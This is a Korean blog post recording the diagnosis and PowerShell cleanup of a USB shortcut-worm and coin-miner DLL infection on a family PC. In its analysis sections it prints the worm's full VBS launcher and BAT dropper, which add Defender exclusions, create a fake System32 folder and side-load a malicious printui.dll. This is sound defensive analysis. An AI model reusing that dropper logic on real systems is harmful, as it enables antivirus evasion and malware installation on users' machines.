---
title: '아빠 컴퓨터 바이러스 해결'
date: 2026-07-06 00:00:00 +0900
categories: [기록, 보안]
tags: [usb, 바이러스, 악성코드, windows-defender, 트러블슈팅]
description: '아빠 컴퓨터에 USB를 꽂았다가 바로가기 바이러스 감염을 발견하고, PC와 USB 두 곳을 파워셸로 직접 점검·분석·정리한 기록이다.'
---
아빠 컴퓨터에 USB를 꽂았다가 바로가기 바이러스 감염을 발견하고, PC와 USB 두 곳을 파워셸로 직접 점검·분석·정리한 기록이다.

---

## 1. 최초 증상

USB를 꽂았을 때 정상 폴더가 아니라 다음과 같은 형태가 보였다.

```text
USB Drive.lnk
sysvolume
숨겨진 USB Drive 폴더
```

특히 `USB Drive`가 실제 폴더가 아니라 **바로가기(.lnk)** 형태로 보였고, 이는 전형적인 **USB 바로가기 바이러스 / USB Shortcut Worm** 증상이다.

---

## 2. PC 보안 상태 확인

### Windows Defender 상태 확인

```powershell
Get-MpComputerStatus |
Select-Object RealTimeProtectionEnabled, BehaviorMonitorEnabled, AntivirusSignatureLastUpdated |
Format-List
```

결과:

```text
RealTimeProtectionEnabled     : True
BehaviorMonitorEnabled        : True
AntivirusSignatureLastUpdated : 2026-07-06 오후 12:13:32
```

판단:

```text
Defender 실시간 보호 정상
동작 감시 정상
```

---

## 3. Defender 제외 목록 확인 및 제거

### 제외 목록 확인

```powershell
Get-MpPreference |
Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension, ExclusionIpAddress |
Format-List
```

초기에 발견된 위험한 제외 항목:

```text
C:\ProgramData\KMSAutoS
C:\Users\82106\AppData\Local\Temp\dControl.exe
C:\Users\82106\Desktop
C:\Windows \System32
C:\Windows\System32
C:\WINDOWS\System32\SECOPatcher.dll
E:\
F:\
G:\
```

특히 위험했던 항목:

```text
C:\Windows \System32
E:\
F:\
G:\
```

`C:\Windows \System32`는 진짜 시스템 폴더가 아니라 `Windows` 뒤에 공백이 들어간 **가짜 시스템 폴더 경로**이다.

최종 확인 결과:

```text
ExclusionPath      :
ExclusionProcess   :
ExclusionExtension :
ExclusionIpAddress :
```

판단:

```text
Defender 제외 목록 제거 완료
이제 E:\, F:\, G:\, System32 등이 검사 제외되지 않음
```

---

## 4. KMSAutoS / dControl / Ratiborus 관련 흔적 확인

```powershell
Test-Path "C:\ProgramData\KMSAutoS"
Test-Path "C:\Windows\KMSAutoS"
Test-Path "C:\Users\82106\AppData\Local\Temp\dControl.exe"
Test-Path "C:\Users\82106\Desktop\RatiborusKMSTools18.10.2023.y.taiwebs.com"
```

결과:

```text
False
False
False
False
```

판단:

```text
KMSAutoS / dControl.exe / Ratiborus KMS Tools 관련 파일은 현재 남아 있지 않음
```

---

## 5. PC 전체 검사

```powershell
Get-MpComputerStatus |
Select-Object FullScanStartTime, FullScanEndTime, AntivirusSignatureLastUpdated, RealTimeProtectionEnabled |
Format-List
```

결과:

```text
FullScanStartTime             : 2026-07-06 오후 7:38:58
FullScanEndTime               : 2026-07-06 오후 8:32:24
AntivirusSignatureLastUpdated : 2026-07-06 오후 12:13:32
RealTimeProtectionEnabled     : True
```

판단:

```text
PC 전체 검사 완료
실시간 보호 정상
```

---

## 6. 첫 번째 USB, F: 드라이브 정리

### 감염 확인

F: 드라이브의 바로가기 대상 확인 결과:

```text
Link   : F:\USB Drive.lnk
Target : F:\sysvolume\996136.vbs
WorkingDirectory : F:\sysvolume
```

판단:

```text
F: USB는 바로가기 바이러스 감염 확정
```

### 발견된 악성 파일

```text
F:\sysvolume\u856357.dat
F:\sysvolume\u333717.bat
F:\sysvolume\u996136.vbs
F:\sysvolume\u491977.bin
```

### 삭제 작업

```powershell
Get-Process wscript,cscript -ErrorAction SilentlyContinue | Stop-Process -Force

cmd /c attrib -h -s -r /s /d F:\sysvolume\*.*

Remove-Item -LiteralPath "F:\sysvolume" -Recurse -Force -ErrorAction SilentlyContinue

Get-ChildItem -LiteralPath F:\ -Force -Filter *.lnk |
Where-Object { -not $_.PSIsContainer } |
Remove-Item -Force
```

### 삭제 확인

```powershell
Test-Path "F:\sysvolume"
```

결과:

```text
False
```

바로가기 확인:

```powershell
Get-ChildItem -LiteralPath F:\ -Force -Filter *.lnk |
Where-Object { -not $_.PSIsContainer }
```

결과 없음.

판단:

```text
F: USB의 sysvolume 삭제 완료
F: USB의 바로가기 파일 삭제 완료
```

이후 F: USB는 포맷했다.

---

## 7. 두 번째 USB, E: 드라이브 분석

USB를 꽂기 전:

```text
C:
D:
```

USB를 꽂은 후:

```text
E: Removable Healthy
```

따라서 새 의심 USB는 `E:`로 확인되었다.

---

## 8. E: USB 바로가기 대상 확인

```powershell
$shell = New-Object -ComObject WScript.Shell

Get-ChildItem -LiteralPath E:\ -Force -Filter *.lnk |
Where-Object { -not $_.PSIsContainer } |
ForEach-Object {
    $s = $shell.CreateShortcut($_.FullName)
    [PSCustomObject]@{
        Link = $_.FullName
        Target = $s.TargetPath
        Arguments = $s.Arguments
        WorkingDirectory = $s.WorkingDirectory
    }
} | Format-List
```

결과:

```text
Link             : E:\USB Drive.lnk
Target           : D:\sysvolume\u739994.vbs
Arguments        :
WorkingDirectory : D:\sysvolume
```

처음에는 `D:\sysvolume`을 가리키는 것으로 보였지만, 확인 결과:

```powershell
Test-Path "D:\sysvolume\u739994.vbs"
Get-ChildItem -LiteralPath "D:\sysvolume" -Force
```

결과:

```text
False
D:\sysvolume 경로 없음
```

판단:

```text
바로가기에는 D:\sysvolume이 기록되어 있었지만 실제 D:\sysvolume은 존재하지 않았음
USB가 과거에 D:였을 때 감염된 흔적일 가능성 있음
```

---

## 9. E: USB 원본 폴더 복구

숨김 처리된 원본 폴더를 복구했다.

```powershell
cmd /c attrib -h -s -r /s /d E:\*.*
```

복구 후 구조:

```text
System Volume Information    정상 Windows 시스템 폴더
sysvolume                    바이러스 폴더
USB Drive                    실제 원본 폴더
USB Drive 바로가기           악성 바로가기
```

삭제 대상:

```text
E:\sysvolume
E:\USB Drive.lnk
```

보존 대상:

```text
E:\USB Drive
E:\System Volume Information
```

---

## 10. E:\sysvolume 내부 파일 확인

```powershell
Get-ChildItem -LiteralPath "E:\sysvolume" -Force
```

결과:

```text
u807242.dat   12,816,896 bytes
u598658.bat   776 bytes
u739994.vbs   480 bytes
u682043.bin   4 bytes
```

판단:

```text
E: USB도 바로가기 바이러스 감염 확정
```

---

## 11. VBS 내용 분석

```powershell
Get-Content -LiteralPath "E:\sysvolume\u739994.vbs" -Encoding Default
```

내용:

```vbscript
If Not WScript.Arguments.Named.Exists("elevated") Then
        Set sh = CreateObject("Shell.Application")
        sh.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 1
        WScript.Quit
End If
Set fs = CreateObject("Scripting.FileSystemObject")
pp = fs.GetParentFolderName(WScript.ScriptFullName)
bp = pp & "\u598658.bat"
If fs.FileExists(bp) Then
        Set sp = WScript.CreateObject("WScript.Shell")
        sp.Run Chr(34) & bp & Chr(34), 0
End If
```

해석:

```text
1. 관리자 권한 요청
2. 자기 자신을 wscript.exe로 관리자 권한 재실행
3. u598658.bat 파일 실행
4. BAT 실행 시 창을 숨김
```

---

## 12. BAT 내용 분석

```powershell
Get-Content -LiteralPath "E:\sysvolume\u598658.bat" -Encoding Default
```

내용:

```bat
@echo off
chcp 65001
explorer "%~dp0..\USB Drive"
if exist "%~dp0u807242.dat" if not exist "C:\Windows \System32\printui.dll" (
        powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'; Add-MpPreference -ExclusionPath 'C:\Windows \System32'; Start-Sleep -Seconds 2"
        if exist "C:\Windows \System32" rmdir /S /Q "\\?\C:\Windows "
        mkdir "\\?\C:\Windows \System32"
        xcopy "C:\Windows\System32\printui.exe" "C:\Windows \System32" /Y
        xcopy "%~dp0u807242.dat" "C:\Windows \System32" /Y
        ren "C:\Windows \System32\u807242.dat" "printui.dll"
        if exist "C:\Windows \System32\printui.exe" (
                if exist "C:\Windows \System32\printui.dll" (
                        start "" "C:\Windows \System32\printui.exe"
                ) else rmdir /S /Q "\\?\C:\Windows "
        ) else rmdir /S /Q "\\?\C:\Windows "
)
```

해석:

```text
1. 실제 USB Drive 폴더를 열어 사용자를 속임
2. Defender 제외 목록에 E:\sysvolume 추가
3. Defender 제외 목록에 C:\Windows \System32 추가
4. C:\Windows \System32 라는 가짜 시스템 폴더 생성
5. 정상 printui.exe를 가짜 폴더에 복사
6. u807242.dat를 가짜 폴더에 복사
7. u807242.dat를 printui.dll로 이름 변경
8. printui.exe를 실행하여 같은 폴더의 printui.dll 로드를 유도
```

핵심 기법:

```text
DLL 사이드로딩
Defender 제외 목록 조작
가짜 System32 폴더 사용
```

---

## 13. 가짜 System32 폴더 확인

```powershell
Test-Path "\\?\C:\Windows \System32"
Test-Path "\\?\C:\Windows \System32\printui.dll"
Test-Path "\\?\C:\Windows \System32\printui.exe"
```

결과:

```text
False
False
False
```

판단:

```text
현재 PC에는 가짜 C:\Windows \System32 폴더 없음
악성 printui.dll 설치 흔적 없음
악성 printui.exe 실행 구조 남아 있지 않음
```

---

## 14. u807242.dat 분석

### 파일 정보

```powershell
Get-Item -LiteralPath "E:\sysvolume\u807242.dat" |
Select-Object FullName, Length, LastWriteTime
```

결과:

```text
FullName                   Length    LastWriteTime
E:\sysvolume\u807242.dat   12816896  2025-10-15 오후 10:39:48
```

### SHA256 해시

```powershell
Get-FileHash -Algorithm SHA256 "E:\sysvolume\u807242.dat"
```

결과:

```text
SHA256
C4B18B05FB52467150217A77C348D666E047EC51E0C3D0B79752CA5B277CC6D4
```

### PE 헤더 분석

```powershell
$path = "E:\sysvolume\u807242.dat"
$b = [System.IO.File]::ReadAllBytes($path)

"MZ Header: " + ([Text.Encoding]::ASCII.GetString($b,0,2))

$pe = [BitConverter]::ToInt32($b,0x3C)
"PE Offset: $pe"
"PE Header: " + ([Text.Encoding]::ASCII.GetString($b,$pe,4))

$machine = [BitConverter]::ToUInt16($b,$pe+4)
$chars = [BitConverter]::ToUInt16($b,$pe+22)

"Machine: 0x{0:X4}" -f $machine
"Is DLL: " + [bool]($chars -band 0x2000)
```

결과:

```text
MZ Header: MZ
PE Offset: 216
PE Header: PE
Machine: 0x8664
Is DLL: True
```

해석:

```text
MZ Header: Windows 실행 파일 계열
PE Header: Portable Executable 형식
Machine 0x8664: 64비트 Windows용
Is DLL True: 실제 내부는 DLL 파일
```

결론:

```text
u807242.dat는 일반 DAT 파일이 아니라, 확장자만 .dat인 64비트 Windows DLL 파일
```

---

## 15. 문자열 추출 결과

문자열 추출 결과:

```text
!This program cannot be run in DOS mode.
printui.dll
PrintUIEntryW
KERNEL32.dll
```

해석:

```text
printui.dll 이름으로 위장
PrintUIEntryW 함수명을 포함
KERNEL32.dll 사용
```

판단:

```text
정상 printui.dll처럼 보이도록 구성된 DLL 사이드로딩용 악성 DLL 가능성 높음
```

---

## 16. 디지털 서명 확인

```powershell
Get-AuthenticodeSignature -LiteralPath "E:\sysvolume\u807242.dat" |
Format-List Status,SignerCertificate
```

결과:

```text
Status            : NotSigned
SignerCertificate :
```

판단:

```text
Microsoft 서명 없음
정상 Windows DLL로 볼 수 없음
```

---

## 17. MetaDefender 결과 해석

MetaDefender에서 해당 SHA256 파일이 탐지되었다.

SHA256:

```text
C4B18B05FB52467150217A77C348D666E047EC51E0C3D0B79752CA5B277CC6D4
```

화면상 탐지 수:

```text
14 / 26
```

확인된 백신 명명 예시:

```text
AhnLab: CoinMiner/Win.Agent
CMC: Trojan_Win32_Malgent_MTB
Avira: TR/W64.Agent
Zillya: Trojan.Agent.Win64
Sophos: Troj/Loader-KK
Gridinsoft: Trojan.Win64.Wacatac.cl
ESET: a variant of Win64/Agent.IGY trojan
```

종합 분류:

```text
Win64 Trojan
Agent
Loader
CoinMiner
DLL 페이로드
```

판단:

```text
u807242.dat는 백신들이 Trojan / Loader / Agent / CoinMiner 계열로 탐지한 64비트 악성 DLL
```

---

## 18. E: USB 악성 파일 삭제

삭제 전 상태:

```text
E:\sysvolume 존재
E:\USB Drive.lnk 존재
```

삭제 명령:

```powershell
Get-Process wscript,cscript -ErrorAction SilentlyContinue | Stop-Process -Force

cmd /c attrib -h -s -r /s /d E:\sysvolume\*.*

Remove-Item -LiteralPath "E:\sysvolume" -Recurse -Force -ErrorAction SilentlyContinue

Get-ChildItem -LiteralPath E:\ -Force -Filter *.lnk |
Where-Object { -not $_.PSIsContainer } |
Remove-Item -Force
```

삭제 확인:

```powershell
Test-Path "E:\sysvolume"
```

결과:

```text
False
```

바로가기 확인:

```powershell
Get-ChildItem -LiteralPath E:\ -Force -Filter *.lnk |
Where-Object { -not $_.PSIsContainer }
```

결과 없음.

잔여 의심 파일 확인:

```powershell
$exts = ".lnk",".vbs",".vbe",".js",".jse",".wsf",".scr",".bat",".cmd"

Get-ChildItem -LiteralPath E:\ -Force -Recurse -ErrorAction SilentlyContinue |
Where-Object {
    -not $_.PSIsContainer -and
    (
        $_.Name -ieq "autorun.inf" -or
        $exts -contains $_.Extension.ToLower()
    )
} |
Select-Object FullName, Length, LastWriteTime
```

결과 없음.

판단:

```text
E:\sysvolume 삭제 완료
E:\USB Drive.lnk 삭제 완료
E:\*.vbs / *.bat / *.cmd / *.js / autorun.inf 잔여물 없음
```

---

## 19. E: USB Defender 검사

```powershell
Start-MpScan -ScanType CustomScan -ScanPath "E:\"
```

이후 탐지 기록 확인:

```powershell
Get-MpThreatDetection |
Sort-Object InitialDetectionTime -Descending |
Select-Object -First 20 InitialDetectionTime, ThreatName, ActionSuccess, Resources
```

결과에는 과거 `E:\sysvolume` 탐지 기록이 남아 있었으나, 모두 `ActionSuccess True`였다.

예시:

```text
2026-07-01 E:\sysvolume\u539157.vbs   ActionSuccess True
2026-07-01 E:\sysvolume\u887119.dat   ActionSuccess True
2026-07-01 E:\sysvolume\u297983.bat   ActionSuccess True
```

해석:

```text
Get-MpThreatDetection은 현재 결과만이 아니라 과거 탐지 기록도 보여줌
ActionSuccess True는 Defender 조치 성공
방금 검사 후 새 E:\sysvolume 탐지는 없음
```

판단:

```text
E: USB는 정리 완료 상태
```

---

## 20. C:\Quarantine_MZ 확인

탐지 기록에 `C:\Quarantine_MZ`가 반복적으로 보였다.

확인:

```powershell
Test-Path "C:\Quarantine_MZ"
```

결과:

```text
False
```

판단:

```text
C:\Quarantine_MZ는 현재 존재하지 않음
```

---

## 21. 현재 실행 중인 의심 프로세스 확인

```powershell
Get-CimInstance Win32_Process |
Where-Object {
    $_.CommandLine -match 'wscript|cscript|rundll32|printui|Windows \\System32|sysvolume|AppData\\Local\\Temp'
} |
Select-Object Name, ProcessId, ExecutablePath, CommandLine |
Format-List
```

결과 없음.

판단:

```text
wscript 실행 없음
cscript 실행 없음
rundll32 의심 실행 없음
printui.exe 의심 실행 없음
sysvolume 실행 흔적 없음
가짜 C:\Windows \System32 실행 흔적 없음
```

---

## 22. 발열 관련 확인

현재 프로세스 CPU 누적 사용량 확인:

```powershell
Get-Process |
Sort-Object CPU -Descending |
Select-Object -First 15 Name, Id, CPU, Path
```

주요 항목:

```text
MsMpEng          Microsoft Defender
ChatGPT          ChatGPT 데스크톱 앱
svchost          Windows 서비스 호스트
System           Windows 시스템
dwm              데스크톱 창 관리자
explorer         Windows 탐색기
IniClientSvc     INITECH 보안 모듈
ASDSvc           AhnLab Safe Transaction
nosstarter.npe   nProtect Online Security
powershell       사용자 실행 PowerShell
```

`Get-Process`의 `CPU` 값은 현재 사용률이 아니라 **프로세스 시작 후 누적 CPU 시간**이다.

발열 가능 원인:

```text
1. 악성 DLL 실행 또는 실행 시도
2. Defender / AhnLab 검사 작업
3. nProtect, AhnLab, INITECH 등 금융 보안 프로그램 동시 실행
```

MetaDefender에서 `CoinMiner/Win.Agent` 진단이 있었으므로, 과거 발열은 악성 DLL 영향이었을 가능성도 있다.  
다만 현재는 발열이 없고, 의심 프로세스도 확인되지 않았다.

---

## 23. 정상 보안 프로그램 확인

### nProtect Online Security

서비스 확인:

```powershell
Get-CimInstance Win32_Service |
Where-Object {
    $_.Name -match "nprotect|nos|inca" -or
    $_.DisplayName -match "nprotect|nos|inca" -or
    $_.PathName -match "nprotect|nos|inca"
} |
Select-Object Name, DisplayName, State, PathName |
Format-List
```

결과:

```text
Name        : nossvc
DisplayName : nProtect Online Security(PFS)
State       : Running
PathName    : "C:\Program Files (x86)\INCAInternet\nProtect Online Security\nossvc.exe" /SVC
```

파일 위치 확인:

```powershell
Get-ChildItem "C:\Program Files (x86)\INCAInternet\nProtect Online Security" -Recurse -Filter "nosstarter.npe" -ErrorAction SilentlyContinue |
Select-Object FullName, Length, LastWriteTime
```

결과:

```text
C:\Program Files (x86)\INCAInternet\nProtect Online Security\nosstarter.npe
```

서명 확인:

```powershell
Get-AuthenticodeSignature "C:\Program Files (x86)\INCAInternet\nProtect Online Security\nosstarter.npe" |
Format-List Status,SignerCertificate
```

결과:

```text
Status : Valid
SignerCertificate :
CN="INCA Internet Co.,Ltd."
Issuer: DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1
```

판단:

```text
nosstarter.npe는 정상 nProtect Online Security 구성 파일
삭제 대상 아님
```

---

## 24. 최종 PC 상태

최종 확인:

```powershell
Get-MpComputerStatus |
Select-Object RealTimeProtectionEnabled, FullScanEndTime, AntivirusSignatureLastUpdated |
Format-List
```

결과:

```text
RealTimeProtectionEnabled     : True
FullScanEndTime               : 2026-07-06 오후 8:32:24
AntivirusSignatureLastUpdated : 2026-07-06 오후 12:13:32
```

Defender 제외 목록:

```powershell
Get-MpPreference |
Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension, ExclusionIpAddress |
Format-List
```

결과:

```text
ExclusionPath      :
ExclusionProcess   :
ExclusionExtension :
ExclusionIpAddress :
```

판단:

```text
실시간 보호 켜짐
전체 검사 완료
Defender 제외 목록 정상
현재 실행 중인 의심 프로세스 없음
가짜 C:\Windows \System32 없음
Quarantine_MZ 없음
```

---

## 최종 결론

### 감염 유형

이번에 확인된 감염은 단순한 USB 바로가기 바이러스보다 더 위험한 형태였다.

분류:

```text
USB Shortcut Worm
VBS/BAT 기반 USB 웜
Win64 Trojan / Loader / Agent
CoinMiner 탐지 포함
DLL 사이드로딩 악성코드
```

### 핵심 악성 구조

```text
USB Drive.lnk
→ u739994.vbs
→ 관리자 권한 요청
→ u598658.bat 숨김 실행
→ 실제 USB Drive 폴더를 열어 사용자 속임
→ Defender 제외 목록 추가
→ 가짜 C:\Windows \System32 생성
→ u807242.dat를 printui.dll로 이름 변경
→ 정상 printui.exe로 악성 DLL 로드 시도
```

### 핵심 악성 파일

```text
E:\sysvolume\u739994.vbs
E:\sysvolume\u598658.bat
E:\sysvolume\u807242.dat
E:\sysvolume\u682043.bin
```

가장 중요한 본체:

```text
u807242.dat
```

분석 결과:

```text
실제 내부 형식: 64비트 Windows DLL
서명: 없음
SHA256: C4B18B05FB52467150217A77C348D666E047EC51E0C3D0B79752CA5B277CC6D4
MetaDefender: 14/26 탐지
탐지명 예: CoinMiner/Win.Agent, Trojan.Agent.Win64, Troj/Loader-KK, Win64/Agent.IGY
```

### 현재 정리 상태

```text
F: USB 정리 및 포맷 완료
E: USB sysvolume 삭제 완료
E: USB 바로가기 삭제 완료
E: USB 잔여 스크립트 없음
PC Defender 제외 목록 제거 완료
KMSAutoS / dControl / Ratiborus 파일 없음
가짜 C:\Windows \System32 없음
Quarantine_MZ 없음
의심 프로세스 없음
실시간 보호 켜짐
전체 검사 완료
```

현재 PC는 **정리된 상태**로 판단된다.

---

## 향후 권장 조치

### 1. 감염 USB는 포맷 권장

빠른 포맷도 가능하다.  
다만 이 USB는 악성 DLL까지 포함된 감염이었으므로, 가능하면 자료 백업 후 포맷하는 것이 가장 안전하다.

포맷 전 백업 가능 파일:

```text
.jpg
.jpeg
.png
.heic
.hwp
.hwpx
.docx
.xlsx
.pptx
.pdf
.txt
.mp4
.mov
```

백업하지 말아야 할 파일:

```text
.lnk
.vbs
.vbe
.js
.jse
.wsf
.bat
.cmd
.scr
.exe
.dll
.dat
.bin
autorun.inf
sysvolume 폴더
```

---

### 2. USB 꽂을 때 먼저 확인할 명령

드라이브 문자가 `E:`라고 가정:

```powershell
Test-Path "E:\sysvolume"
```

정상:

```text
False
```

바로가기 확인:

```powershell
Get-ChildItem -LiteralPath E:\ -Force -Filter *.lnk |
Where-Object { -not $_.PSIsContainer }
```

아무것도 안 나오면 정상.

의심 파일 전체 확인:

```powershell
$exts = ".lnk",".vbs",".vbe",".js",".jse",".wsf",".scr",".bat",".cmd"

Get-ChildItem -LiteralPath E:\ -Force -Recurse -ErrorAction SilentlyContinue |
Where-Object {
    -not $_.PSIsContainer -and
    (
        $_.Name -ieq "autorun.inf" -or
        $exts -contains $_.Extension.ToLower()
    )
} |
Select-Object FullName, Length, LastWriteTime
```

---

### 3. Defender 상태 주기 확인

```powershell
Get-MpComputerStatus |
Select-Object RealTimeProtectionEnabled, AntivirusSignatureLastUpdated |
Format-List
```

```powershell
Get-MpPreference |
Select-Object ExclusionPath, ExclusionProcess, ExclusionExtension, ExclusionIpAddress |
Format-List
```

정상 상태:

```text
RealTimeProtectionEnabled : True
ExclusionPath             :
ExclusionProcess          :
ExclusionExtension        :
ExclusionIpAddress        :
```

---

### 4. 찝찝하면 오프라인 검사

```powershell
Start-MpWDOScan
```

재부팅 후 Windows 시작 전 단계에서 검사한다.

---

## 최종 한 줄 요약

이번 USB 감염은 **바로가기 클릭을 유도해 관리자 권한으로 Defender 제외를 추가하고, `u807242.dat`라는 64비트 악성 DLL을 `printui.dll`로 위장해 실행하려던 USB 전파형 Trojan/Loader/CoinMiner 계열 악성코드**였고, 현재는 **USB와 PC 모두 주요 감염 흔적이 제거된 상태**로 판단된다.

## 관련 노트

- [2026-07-06](/posts/daily-2026-07-06/) — 이 바이러스를 발견·치료한 날의 일지